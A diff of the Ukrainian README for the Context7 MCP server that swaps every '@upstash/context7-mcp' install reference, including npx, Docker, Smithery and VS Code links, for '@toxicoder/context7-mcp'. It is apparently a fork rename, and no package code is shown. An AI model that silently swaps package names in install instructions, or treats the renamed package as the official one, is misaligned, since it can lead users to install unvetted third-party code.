@@ -1,6 +1,6 @@
 # Context7 MCP — Актуальна документація з прикладами коду для будь-якого запиту
 
-[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@upstash/context7-mcp)](https://smithery.ai/server/@upstash/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[![Website](https://img.shields.io/badge/Website-context7.com-blue)](https://context7.com) [![smithery badge](https://smithery.ai/badge/@toxicoder/context7-mcp)](https://smithery.ai/server/@toxicoder/context7-mcp) [<img alt="Install in VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Install%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 [![繁體中文](https://img.shields.io/badge/docs-繁體中文-yellow)](./README.zh-TW.md) [![简体中文](https://img.shields.io/badge/docs-简体中文-yellow)](./README.zh-CN.md) [![日本語](https://img.shields.io/badge/docs-日本語-b7003a)](./README.ja.md) [![한국어 문서](https://img.shields.io/badge/docs-한국어-green)](./README.ko.md) [![Documentación en Español](https://img.shields.io/badge/docs-Español-orange)](./README.es.md) [![Documentation en Français](https://img.shields.io/badge/docs-Français-blue)](./README.fr.md) [![Documentação em Português (Brasil)](<https://img.shields.io/badge/docs-Português%20(Brasil)-purple>)](./README.pt-BR.md) [![Documentazione in italiano](https://img.shields.io/badge/docs-Italian-red)](./README.it.md) [![Dokumentasi Bahasa Indonesia](https://img.shields.io/badge/docs-Bahasa%20Indonesia-pink)](./README.id-ID.md) [![Dokumentation auf Deutsch](https://img.shields.io/badge/docs-Deutsch-darkgreen)](./README.de.md) [![Документация на русском языке](https://img.shields.io/badge/docs-Русский-darkblue)](./README.ru.md) [![Türkçe Doküman](https://img.shields.io/badge/docs-Türkçe-blue)](./README.tr.md) [![Arabic Documentation](https://img.shields.io/badge/docs-Arabic-white)](./README.ar.md) [![Українська документація](https://img.shields.io/badge/docs-Українська-lightblue)](./README.uk.md)
 
@@ -48,13 +48,13 @@ Context7 завантажує свіжі приклади коду й докум
 <details>
 <summary><b>Встановлення через Smithery</b></summary>
 
-Для автоматичного встановлення Context7 MCP Server для будь-якого клієнта через [Smithery](https://smithery.ai/server/@upstash/context7-mcp):
+Для автоматичного встановлення Context7 MCP Server для будь-якого клієнта через [Smithery](https://smithery.ai/server/@toxicoder/context7-mcp):
 
 ```bash
-npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME> --key <YOUR_SMITHERY_KEY>
+npx -y @smithery/cli@latest install @toxicoder/context7-mcp --client <CLIENT_NAME> --key <YOUR_SMITHERY_KEY>
 ```
 
-Ваш ключ Smithery можна знайти на [сторінці Smithery.ai](https://smithery.ai/server/@upstash/context7-mcp).
+Ваш ключ Smithery можна знайти на [сторінці Smithery.ai](https://smithery.ai/server/@toxicoder/context7-mcp).
 
 </details>
 
@@ -90,7 +90,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -106,7 +106,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -128,7 +128,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
         "run",
         "--allow-env=NO_DEPRECATION,TRACE_DEPRECATION",
         "--allow-net",
-        "npm:@upstash/context7-mcp"
+        "npm:@toxicoder/context7-mcp"
       ]
     }
   }
@@ -163,7 +163,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -196,7 +196,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -207,8 +207,8 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
 <details>
 <summary><b>Встановлення в VS Code</b></summary>
 
-[<img alt="Встановити в VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Встановити%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
-[<img alt="Встановити в VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Встановити%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40upstash%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Встановити в VS Code (npx)" src="https://img.shields.io/badge/VS_Code-VS_Code?style=flat-square&label=Встановити%20Context7%20MCP&color=0098FF">](https://insiders.vscode.dev/redirect?url=vscode%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
+[<img alt="Встановити в VS Code Insiders (npx)" src="https://img.shields.io/badge/VS_Code_Insiders-VS_Code_Insiders?style=flat-square&label=Встановити%20Context7%20MCP&color=24bfa5">](https://insiders.vscode.dev/redirect?url=vscode-insiders%3Amcp%2Finstall%3F%7B%22name%22%3A%22context7%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40toxicoder%2Fcontext7-mcp%40latest%22%5D%7D)
 
 Додайте це до вашого конфігураційного файлу VS Code MCP. Детальніше див. у [документації VS Code MCP](https://code.visualstudio.com/docs/copilot/chat/mcp-servers).
 
@@ -233,7 +233,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
     "context7": {
       "type": "stdio",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -270,7 +270,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
       "context7": {
         "type": "stdio",
         "command": "npx",
-        "args": ["-y", "@upstash/context7-mcp"]
+        "args": ["-y", "@toxicoder/context7-mcp"]
       }
     }
   }
@@ -290,7 +290,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
     "Context7": {
       "source": "custom",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -354,7 +354,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
       "type": "local",
       "command": "npx",
       "tools": ["get-library-docs", "resolve-library-id"],
-      "args": ["-y", "@upstash/context7-mcp", "--api-key", "YOUR_API_KEY"]
+      "args": ["-y", "@toxicoder/context7-mcp", "--api-key", "YOUR_API_KEY"]
     }
   }
 }
@@ -377,7 +377,7 @@ npx -y @smithery/cli@latest install @upstash/context7-mcp --client <CLIENT_NAME>
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -401,7 +401,7 @@ claude mcp add --transport http context7 https://mcp.context7.com/mcp
 #### Підключення до локального сервера Claude Code
 
 ```sh
-claude mcp add context7 -- npx -y @upstash/context7-mcp
+claude mcp add context7 -- npx -y @toxicoder/context7-mcp
 ```
 
 </details>
@@ -416,7 +416,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcpServers": {
     "Context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -446,7 +446,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -474,7 +474,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
    WORKDIR /app
 
    # Встановіть найновішу версію глобально
-   RUN npm install -g @upstash/context7-mcp
+   RUN npm install -g @toxicoder/context7-mcp
 
    # Відкрийте стандартний порт, якщо потрібно (необов'язково, залежить від взаємодії з MCP-клієнтом)
    # EXPOSE 3000
@@ -524,9 +524,9 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
 ```json
 {
   "mcpServers": {
-    "github.com/upstash/context7-mcp": {
+    "github.com/toxicoder/context7-mcp": {
       "command": "cmd",
-      "args": ["/c", "npx", "-y", "@upstash/context7-mcp@latest"],
+      "args": ["/c", "npx", "-y", "@toxicoder/context7-mcp@latest"],
       "disabled": false,
       "autoApprove": []
     }
@@ -550,7 +550,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
 5. Введіть наступну команду:
 
    ```
-   npx -y @upstash/context7-mcp@latest
+   npx -y @toxicoder/context7-mcp@latest
    ```
 
 6. Назва MCP: **Context7**.
@@ -569,7 +569,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
     {
       "name": "context7",
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   ]
 }
@@ -602,7 +602,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -623,7 +623,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
 ```json
 {
   "command": "npx",
-  "args": ["-y", "@upstash/context7-mcp@latest"]
+  "args": ["-y", "@toxicoder/context7-mcp@latest"]
 }
 ```
 
@@ -639,7 +639,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp@latest"]
+      "args": ["-y", "@toxicoder/context7-mcp@latest"]
     }
   }
 }
@@ -684,7 +684,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -707,7 +707,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
 {
   "Context7": {
     "command": "npx",
-    "args": ["-y", "@upstash/context7-mcp"],
+    "args": ["-y", "@toxicoder/context7-mcp"],
     "env": {},
     "working_directory": null,
     "start_on_launch": true
@@ -743,7 +743,7 @@ claude mcp add context7 -- npx -y @upstash/context7-mcp
   "mcp": {
     "context7": {
       "type": "local",
-      "command": ["npx", "-y", "@upstash/context7-mcp"],
+      "command": ["npx", "-y", "@toxicoder/context7-mcp"],
       "enabled": true
     }
   }
@@ -841,7 +841,7 @@ bun run dist/index.js --transport http --port 8080
 <summary><b>Тестування з MCP Inspector</b></summary>
 
 ```bash
-npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
+npx -y @modelcontextprotocol/inspector npx @toxicoder/context7-mcp
 ```
 
 </details>
@@ -858,7 +858,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "bunx",
-      "args": ["-y", "@upstash/context7-mcp"]
+      "args": ["-y", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -878,7 +878,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-vm-modules", "@upstash/context7-mcp@1.0.6"]
+      "args": ["-y", "--node-options=--experimental-vm-modules", "@toxicoder/context7-mcp@1.0.6"]
     }
   }
 }
@@ -896,7 +896,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
   "mcpServers": {
     "context7": {
       "command": "npx",
-      "args": ["-y", "--node-options=--experimental-fetch", "@upstash/context7-mcp"]
+      "args": ["-y", "--node-options=--experimental-fetch", "@toxicoder/context7-mcp"]
     }
   }
 }
@@ -939,7 +939,7 @@ npx -y @modelcontextprotocol/inspector npx @upstash/context7-mcp
 
 ## ⭐ Історія зірок
 
-[![Діаграма історії зірок](https://api.star-history.com/svg?repos=upstash/context7&type=Date)](https://www.star-history.com/#upstash/context7&Date)
+[![Діаграма історії зірок](https://api.star-history.com/svg?repos=toxicoder/context7&type=Date)](https://www.star-history.com/#toxicoder/context7&Date)
 
 ## 📄 Ліцензія
 
